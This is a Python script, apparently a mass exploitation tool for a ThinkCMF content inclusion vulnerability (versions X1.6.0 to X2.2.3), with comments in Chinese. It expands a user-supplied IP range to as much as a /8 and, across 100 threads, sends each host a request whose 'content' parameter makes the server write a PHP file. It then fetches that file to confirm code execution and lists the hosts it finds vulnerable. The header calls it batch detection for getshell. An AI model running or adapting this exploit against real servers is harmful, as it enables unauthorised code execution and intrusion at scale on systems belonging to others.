
# -*- coding: UTF-8 -*-
# auth: @ht0Ruial
# python version:3.7.3
# ThinkCMF框架任意内容包含漏洞批量检测getshell

# 影响版本:
#     ThinkCMF X1.6.0
#     ThinkCMF X2.1.0
#     ThinkCMF X2.2.0
#     ThinkCMF X2.2.1
#     ThinkCMF X2.2.2
#     ThinkCMF X2.2.3
# usage:python thinkcmf.py

import requests
from math import pow
from multiprocessing.dummy import Pool
from bs4 import BeautifulSoup

def getip(ip):
    if ip.find('/') == -1:
        target_host=[]
        target_host.append(ip)
        pools(target_host)
    elif ip.find('/') != -1:
        ip_list = ip.split('/')
        ip_arr = ip_list[0].split('.')
        ci =int(ip_list[1])/8 
        num = int(ci)  
        b = int(ip_list[1])-num*8
        c = 8-b
        d = 0
        for i in range(c):
            d += pow(2,i)
        e = int(ip_arr[num])+int(d)+1

        if ci >= 3 : #10.10.10.x C段
            target_host=[]
            if int(ip_list[1]) == 24 :
                ip_arr[num] = 1
                e = 255
            for i in range(int(ip_arr[num]),e) :
                ip_arr[3] = str(i)
                ip_nums = '.'.join(ip_arr)
                target_host.append(ip_nums)
            pools(target_host) 

        elif ci >= 2 : #10.10.x.x B段
            if int(ip_list[1]) == 16 :
                ip_arr[num] = 1
                e = 255
            for i in range(int(ip_arr[num]),e) :
                ip_arr[2] = str(i)
                target_host=[]
                for j in range(1,255):
                    ip_arr[3] = str(j)
                    ip_nums = '.'.join(ip_arr)
                    target_host.append(ip_nums)
                pools(target_host)

        elif ci >= 1 : #10.x.x.x A段
            if int(ip_list[1]) == 8 :
                ip_arr[num] = 1
                e = 255
            for i in range(int(ip_arr[num]),e) :
                ip_arr[1] = str(i)
                for j in range(1,255):
                    ip_arr[2] = str(j)
                    target_host=[]
                    for k in range(1,255):
                        ip_arr[3] = str(k)
                        ip_nums = '.'.join(ip_arr)
                        target_host.append(ip_nums)
                    pools(target_host)

def pools(target_host):
    pool = Pool(processes = 100)# 默认100个线程
    pool.map(exploit, target_host)
    pool.close()#关闭进程池，不再接受新的进程
    pool.join()#主进程阻塞等待子进程的退出

def exploit(ip):
    try:
        f_name = 'test.php'
        payload = "<php>file_put_contents('{}','<?php phpinfo(); ?>')</php>".format(f_name)
        par = { 'a':'fetch','templateFile':'public/index','prefix':'','content': payload }
        r= requests.get("http://%s/" %ip ,params=par,timeout=4)
        if r.status_code == 200:
            res = requests.get("http://{}/{}".format(ip,f_name))
            soup = BeautifulSoup(res.text,'html.parser')
            check = soup.select('body > div.center > h1:nth-child(8)')
            if check[0].get_text() == 'Configuration':
                print(ip,"存在漏洞")
    except:
        pass

if __name__ == "__main__":
    ip = input("请输入ip范围：")
    print('-----------正在检测中-----------')
    getip(ip)
    print('-----------检测完成-----------')